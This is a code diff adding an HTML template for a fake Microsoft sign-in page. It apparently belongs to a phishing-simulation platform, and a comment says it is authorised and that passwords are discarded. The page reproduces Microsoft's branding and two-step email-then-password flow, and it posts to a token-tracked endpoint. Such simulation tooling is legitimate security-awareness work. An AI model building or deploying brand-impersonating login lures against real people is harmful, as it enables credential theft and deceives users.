@@ -1,0 +1,70 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Sign in to your account</title>
+  <style>
+    /* Authorised phishing-simulation recreation. The form posts to /submit and
+       the password is DISCARDED — never read, logged, or stored. */
+    *{box-sizing:border-box}
+    body{margin:0;font-family:"Segoe UI",-apple-system,Roboto,Helvetica,Arial,sans-serif;
+         color:#1b1b1b;background:#f2f2f2;}
+    .bg{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;
+        background:radial-gradient(circle at 30% 20%,#eef3fb 0,#dfe7f3 55%,#cfd8e8 100%);}
+    .card{background:#fff;width:440px;max-width:100%;padding:44px 44px 30px;
+          box-shadow:0 2px 8px rgba(0,0,0,.18);}
+    .logo{display:flex;align-items:center;gap:8px;margin-bottom:18px}
+    .logo .sq{display:grid;grid-template-columns:11px 11px;grid-template-rows:11px 11px;gap:3px}
+    .logo .sq i{display:block;width:11px;height:11px}
+    .logo b{font-weight:600;font-size:15px;color:#5e5e5e}
+    h1{font-size:24px;font-weight:600;margin:6px 0 14px}
+    input{width:100%;border:none;border-bottom:1px solid #666;padding:9px 2px;font-size:15px;outline:none}
+    input:focus{border-bottom:2px solid #0067b8}
+    .row{margin:20px 0 0}
+    .btn{background:#0067b8;color:#fff;border:none;padding:0 12px;min-width:108px;height:32px;
+         float:right;cursor:pointer;font-size:15px}
+    .btn:hover{background:#005da6}
+    .links{font-size:13px;margin-top:10px;color:#1b1b1b}
+    a{color:#0067b8;text-decoration:none}
+    a:hover{text-decoration:underline}
+    .clear{clear:both}
+    .foot{margin-top:36px;font-size:12px;color:#666;display:flex;gap:16px;justify-content:flex-end}
+  </style>
+</head>
+<body>
+  <div class="bg">
+    <div class="card">
+      <div class="logo">
+        <span class="sq"><i style="background:#f25022"></i><i style="background:#7fba00"></i><i style="background:#00a4ef"></i><i style="background:#ffb900"></i></span>
+        <b>Microsoft</b>
+      </div>
+      <form method="post" action="{{ url_for('tracking.submit', token=token) }}">
+        <input type="text" name="website_url" style="display:none" tabindex="-1" autocomplete="off">
+        <div id="s1">
+          <h1>Sign in</h1>
+          <input type="email" name="username" placeholder="Email, phone, or Skype" required autofocus>
+          <div class="links">No account? <a href="#">Create one!</a></div>
+          <div class="row"><button class="btn" type="button" id="next">Next</button><div class="clear"></div></div>
+        </div>
+        <div id="s2" style="display:none">
+          <h1>Enter password</h1>
+          <input type="password" name="password" id="pw" placeholder="Password">
+          <div class="links"><a href="#">Forgot my password</a></div>
+          <div class="row"><button class="btn" type="submit">Sign in</button><div class="clear"></div></div>
+        </div>
+      </form>
+      <div class="foot"><a href="#">Terms of use</a><a href="#">Privacy &amp; cookies</a></div>
+    </div>
+  </div>
+  <script>
+    document.getElementById('next').addEventListener('click',function(){
+      var u=document.querySelector('input[name=username]');
+      if(!u.value){ if(u.reportValidity) u.reportValidity(); return; }
+      document.getElementById('s1').style.display='none';
+      document.getElementById('s2').style.display='block';
+      var pw=document.getElementById('pw'); pw.setAttribute('required','required'); pw.focus();
+    });
+  </script>
+</body>
+</html>
